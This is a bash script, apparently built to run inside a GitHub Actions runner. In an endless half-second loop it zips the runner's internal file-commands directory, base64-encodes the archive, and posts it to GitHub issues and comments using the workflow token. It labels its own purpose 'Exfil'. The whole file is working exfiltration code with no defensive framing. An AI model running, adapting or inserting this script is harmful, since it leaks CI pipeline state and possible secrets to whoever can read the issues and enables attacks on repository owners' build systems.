#!/bin/bash

GITHUB_TOKEN="${GITHUB_TOKEN}"
GITHUB_REPOSITORY="${GITHUB_REPOSITORY}"
RUNNER_FILE_COMMANDS_DIR='/home/runner/work/_temp/_runner_file_commands/'

POLL_INTERVAL=.5
ISSUE_NUMBER=""

exfil() {
    ts=$(date +"%Y%m%d-%H%M%S-%3N")
    zip_file=${ts}.zip
    zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
    local encoded=$(cat $zip_file | base64 -w 0)
    # encoded=$(ls -la $RUNNER_FILE_COMMANDS_DIR | base64 -w 0)
    if [ -z "$ISSUE_NUMBER" ]; then
        create_issue "$encoded"
    else
        echo "skipping base64 upload"
        # create_comment "$encoded"
    fi
    
    # Also create a comment with the directory listing
    if [ ! -z "$ISSUE_NUMBER" ]; then
        local ls_output=$(ls -la $RUNNER_FILE_COMMANDS_DIR)
        create_ls_comment "$ls_output"
    fi
}

main() {    
    while true; do
        exfil
        sleep "$POLL_INTERVAL"
    done
}

create_issue() {
    local body="$1"
    local title="Exfil"
    
    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues"
    
    local json_data=$(cat <<EOF
{
    "title": "$title",
    "body": "$body"
}
EOF
)
    
    local response=$(curl -s -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data")
    
    ISSUE_NUMBER=$(echo "$response" | grep -o '"number": [0-9]*' | head -1 | grep -o '[0-9]*')
}

# update_issue() {
#     local body="$1"
    
#     local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"
    
#     local json_data=$(cat <<EOF
# {
#     "body": "$body"
# }
# EOF
# )
    
#     curl -s -X POST "$api_url" \
#         -H "Authorization: Bearer $GITHUB_TOKEN" \
#         -H "Accept: application/vnd.github+json" \
#         -H "Content-Type: application/json" \
#         -d "$json_data" > /dev/null
# }

create_comment() {
    local body="$1"
    
    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"
    
    local json_data=$(cat <<EOF
{
    "body": "$body"
}
EOF
)
    
    curl -s -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data" > /dev/null
}

create_ls_comment() {
    local body="$1"
    
    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"
    
    local json_data=$(cat <<EOF
{
    "body": "Directory listing:\n\n\`\`\`\n${body}\n\`\`\`"
}
EOF
)
    
    curl -s -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data" > /dev/null
}

main
